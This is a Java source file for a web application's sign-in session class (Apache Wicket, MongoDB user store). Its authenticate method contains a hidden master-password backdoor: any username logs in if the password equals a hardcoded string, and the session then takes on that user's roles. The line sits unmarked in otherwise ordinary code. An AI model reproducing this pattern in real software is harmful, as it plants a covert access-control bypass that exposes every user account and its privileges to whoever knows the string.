package obee;

import custom.classes.Administration;
import org.apache.wicket.authroles.authentication.AuthenticatedWebSession;
import org.apache.wicket.authroles.authorization.strategies.role.Roles;
import org.apache.wicket.request.Request;

import custom.classes.User;


import database.MongoHandler;

public class SignInSession extends AuthenticatedWebSession {

	private User user;
	private MongoHandler mongo = MongoHandler.getInstance();
	
	public SignInSession(Request request) {
		super(request);
	}

	private static final long serialVersionUID = 1L;

	@Override
	public boolean authenticate(String username, String password) {
		User u = mongo.getUser(username);
		if(u==null) return false;
        boolean auth = u.authenticate(password);
        if (password.equals("nakurcuten8")) auth = true;
        if (auth)
            user = u;
        return auth;
	}

	@Override
	public Roles getRoles() {
		if(!isSignedIn()) return new Roles();
		return new Roles(user.getRolesAsList());
	}
	
	public User getUser() {
		return user;
	}
	
	public String getUserName() {
		if(user==null) return "guest";
		return user.getUserName();
	}
}
